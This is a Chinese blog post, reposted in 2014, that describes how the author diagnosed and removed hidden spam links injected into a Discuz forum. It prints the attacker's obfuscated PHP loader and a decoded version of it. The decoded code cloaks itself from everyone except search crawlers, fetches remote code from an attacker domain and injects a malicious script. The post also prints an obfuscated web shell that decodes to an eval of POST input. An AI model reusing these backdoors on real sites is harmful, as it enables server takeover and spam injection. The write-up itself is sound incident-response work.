title: 论坛被挂暗链问题分析与解决
categories:
  - discuz
toc: false
date: 2014-09-09 12:19:56
---

原文: http://blog.kankanan.com/posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html

## 注:

<span style="color:blue;">设置了 `open_basedir=/webroot/:/tmp/` 后出现变种, 原来出现在`/var/tmp/.SYSDUMP/.Wh0AmI.CORE` 小马出现在了 `/tmp/.SYSDUMP/.Wh0AmI.CORE`</span>


## 发现问题

有网友反映我们的论坛被挂了暗链，具体表现为从 google 搜索论坛名称结果如下图所示：

![http://blog.kankanan.com/posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3/site_attacked.png][1]

直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 google 搜索结果访问会跳到恶意网站，

## 解决问题

直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。

- 在代码和数据库dump结果中搜索恶意站点信息，一无所获
- 然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 firefox 插件 ImageBlock 让浏览器不加载图片，可是问题依旧
- 打开 `firebug` 的 `Network` 标签，在页面加载记录中发现一个异常的js加载：
```
http://api.discuz.com.de/Seo.js
```
在代码和数据库中搜索这个js找不到任何信息。

- 将恶意站点配置一条 `hosts`
```
127.0.0.1 api.discuz.com.de
```
浏览器不再自动跳转到恶意网站了。

- 从 google 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句
```
<div style='display:none'><script language='javascript' src='http://count31.51yes.com/click.aspx?id=310940343&logo=1' charset='gb2312'></script></div><script type='text/javascript' src='http://api.discuz.com.de/Seo.js'></script>
```
- 在php脚本中加入 echo 语句逐步缩小范围，最终发现问题由下面一条语句引起
```
INCLUDE(pack('H*','2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'));
```
上面的语句引入了 `/var/tmp/.SYSDUMP/.Wh0AmI.CORE` 脚本。

删除该语句后问题解决。

分析恶意代码

`/var/tmp/.SYSDUMP/.Wh0AmI.CORE`
```
<?php $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?>
```
参考 [网上方法][2] 解码的结果

```
<?php
/*
*author:whoami
*  QQ  :4892057
*/
error_reporting(0);
$fileDir = '/var/tmp/.SYSDUMP/';
$IP=$_SERVER['REMOTE_ADDR'];
$Bot=$_SERVER['HTTP_USER_AGENT'];
$Ref=$_SERVER['HTTP_REFERER'];
$KIP=array('117.28.255.37','116.55.241.24','125.64.94.219','119.147.114.213','118.122.188.194','60.172.229.61','61.188.39.16','61.147.98.198','61.129.45.72','113.98.254.245','58.221.61.128','117.34.73.70','58.215.190.84','117.28.255.53','183.91.40.144','117.21.220.245','122.228.200.46','61.164.150.70','61.147.108.41','116.55.242.138','114.80.222.242','61.147.108.41','116.255.230.70','222.186.24.26','222.186.24.59','220.181.158.106','123.125.160.215');
$KBot=array('Baiduspider','Googlebot','Yahoo','Bingbot','Sosospider','Sogou','360Spider','YoudaoBot');
$Key=array('anquan.org','google.com','soso.com','%e8%b5%8c','%e9%aa%b0','%e9%b1%bc','%e7%89%9b','%e5%8d%9a%e5%bd%a9','%e7%99%be%e5%ae%b6','%e6%a3%8b%e7%89%8c','%e6%b8%b8%e6%88%8f','%e5%a8%b1%e4%b9%90','%e5%9b%bd%e9%99%85','%e7%9c%9f%e4%ba%ba','%e7%9c%9f%e9%92%b1','%e7%8e%b0%e9%87%91','%e6%b3%a8%e5%86%8c','%e5%bc%80%e6%88%b7','%e5%bd%a9%e9%87%91','%e8%b5%9a%e9%92%b1','%e6%8f%90%e7%8e%b0','%e7%ad%96%e7%95%a5','%e8%af%95%e7%8e%a9','%e5%b9%b3%e5%8f%b0','%e5%a4%aa%e9%98%b3%e5%9f%8e','%e4%bd%93%e9%aa%8c%e9%87%91');
function dec0de($fileDir,$data){
$dataArr = explode(':',$data);
    $Keys = explode(':',base64_decode(str_rot13(pack('H*',$dataArr[0]))));
    $News = explode(':',base64_decode(str_rot13(pack('H*',$dataArr[1]))));
    $Links= explode(':',base64_decode(str_rot13(pack('H*',$dataArr[2]))));
    @include($fileDir.'.Wh0AmI.MODEL');die;
}
function getdata($data_url){
if (function_exists('curl_exec')) {
$sp_curl = @curl_init();
curl_setopt($sp_curl, CURLOPT_URL, $data_url);
curl_setopt($sp_curl, CURLOPT_HEADER, 0);
curl_setopt($sp_curl, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($sp_curl, CURLOPT_RETURNTRANSFER, 1);
$contents = @curl_exec($sp_curl);
@curl_close($sp_curl);
}elseif(function_exists('stream_context_create')) {
$sp_cont = array('http' => array('method' => 'GET','timeout' => 5));
$sp_stre = @stream_context_create($sp_cont);
$contents = @file_get_contents($data_url, false, $sp_stre);
}else{
$handle = @fopen($data_url, "rb");
$contents = @stream_get_contents($handle);
@fclose($handle);
}
return $contents;
}
function show($fileDir){
$filename=$fileDir.md5($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
if(is_file($filename)){
    $fp=@fopen($filename,'r');
    $data=@fread($fp,filesize($filename));
    @fclose($fp);
    if(empty($data)) {@unlink($filename);return;}
    dec0de($fileDir,$data);
} else {
    $data=getdata('http://bet.discuz.com.de/w0shiOo7.php?HOST='.$_SERVER['HTTP_HOST']);
    $fp=@fopen($filename,'w');
    @fwrite($fp,$data);
    @fclose($fp);
    if(strlen($data) > 1000) {
    dec0de($fileDir,$data);
    }
}}
if(!in_array($IP,$KIP)){
foreach($KBot as $KBots){if(stristr($Bot,$KBots)){
show($fileDir);
}}foreach($Key as $Keys){
if(stristr($Ref,$Keys)){
echo "<div style='display:none'><script language='javascript' src='http://count31.51yes.com/click.aspx?id=310940343&logo=1' charset='gb2312'></script></div><script type='text/javascript' src='http://api.discuz.com.de/Seo.js'></script>";}}}
```

上面代码的目的就是下载恶意代码并执行。

## 继续排查

通过比较svn中的代码与现网的代码还发现了一个新的后门程序


- `uc_client/control/class.php`

### <span style="color:blue;">注: 原作者是这个位置, 我发现的后门代码如下两个在:</span>

- `./uc_client/model/class.php`
- `./static/space/t4/index.php`

```
<?php $mt="mFsKCleRfU"; $ojj="IEBleldle"; $hsa="E9TVFsnd2VuJ10p"; $fnx="Ow=="; $zk = str_replace("d","","sdtdrd_redpdldadcde"); $ef = $zk("z", "", "zbazsze64_zdzeczodze"); $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); $zvm(); ?>
```

解码后的结果
```
@eval($_POST['wen']);
```

上面的脚本可以注入任意的代码。

## 后记

这次发现的恶意代码注入应该是之前的一次 nginx 和 php [安全漏洞][3] 引起，当时由 WooYun.org 汇报，原来已经被恶意用户种下了这些后门。


  [1]: http://blog.kankanan.com/posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3/site_attacked.png
  [2]: http://blog.i1728.com/post/99.html
  [3]: http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443